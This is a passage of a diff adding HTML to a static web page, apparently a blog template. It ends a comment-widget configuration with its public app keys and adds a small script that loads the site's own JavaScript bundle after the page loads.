+            appId: "UF41K2V1YdIabj0Hd9TXLuV9-gzGzoHsz",
+            appKey: "EfXnzBbp4gTCI4U99bctAjO8",
+            avatar:'mm',
+            placeholder: "Just go",
+            guest_info:guest_info,
+            pageSize:'10'
+        });
+    </script>
+  
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
